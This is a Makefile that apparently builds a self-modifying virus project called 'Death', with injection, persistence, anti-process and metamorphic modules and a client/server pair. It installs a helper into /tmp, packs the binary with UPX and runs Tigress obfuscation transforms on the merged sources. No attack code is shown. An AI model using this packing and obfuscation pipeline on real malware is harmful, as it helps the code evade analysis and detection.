NAME		= Death
CC			= cc
CFLAGS		= -Wall -Wextra -Werror -I include -g3 -no-pie
SRCDIR		= src
OBJDIR		= obj

SRC         = $(SRCDIR)/main.c \
			  $(SRCDIR)/death.c \
			  $(SRCDIR)/find.c \
			  $(SRCDIR)/detect.c \
			  $(SRCDIR)/inject.c \
			  $(SRCDIR)/anti_process.c \
			  $(SRCDIR)/utils.c \
			  $(SRCDIR)/patch_init.c \
			  $(SRCDIR)/section.c \
			  $(SRCDIR)/persistence.c \
			  $(SRCDIR)/metamorphic.c

OBJ			= $(SRC:$(SRCDIR)/%.c=$(OBJDIR)/%.o)

all: $(NAME) war_helper_install

war_helper:
	$(MAKE) -C war_helper

war_helper_install: war_helper
	@mkdir -p /tmp/war_helper
	@cp war_helper/war_helper /tmp/war_helper/
	@chmod +x /tmp/war_helper/war_helper
	upx $(NAME)

$(NAME): $(OBJ) client.o server.o
	$(CC) $(CFLAGS) $(OBJ) -o $(NAME)
	$(CC) $(CFLAGS) client.o -o client
	$(CC) $(CFLAGS) server.o -o server

$(OBJDIR)/%.o: $(SRCDIR)/%.c | $(OBJDIR)
	$(CC) $(CFLAGS) -c $< -o $@

$(OBJDIR):
	mkdir -p $(OBJDIR)

obfuscate: all.c
	gcc -I include -E -std=c99 -U_GNU_SOURCE \
		-D_Float32=float \
		-D_Float64=double \
		-D_Float128="long double" \
		-D_Float32x=double \
		-D_Float64x="long double" \
		all.c -o all_preprocessed.c
	tigress --Environment=x86_64:Linux:Gcc:4.6 \
        --Transform=InitEntropy --Functions=main \
        --Transform=InitOpaque --Functions="*" --InitOpaqueStructs=list,array,env \
        --Transform=EncodeArithmetic --Functions="*" \
        --Transform=Flatten --Functions="*" \
        --Transform=AddOpaque --Functions="*" \
        --out=obfuscated.c \
        all_preprocessed.c
	gcc obfuscated.c -o obfuscated

all.c: $(SRC)
	@for f in $(SRC); do echo "#include \"$$f\""; done > all.c

clean:
	rm -rf $(OBJDIR)
	$(MAKE) -C war_helper clean || true
	rm -f client.o
	rm -f server.o
	rm -f all.c
	rm -f all_preprocessed.c
	rm -f obfuscated.c

fclean: clean
	rm -f $(NAME)
	rm -f /tmp/war_helper/war_helper
	rm -f client
	rm -f server
	rm -f obfuscated

re: fclean all

.PHONY: all clean fclean re war_helper war_helper_install all.c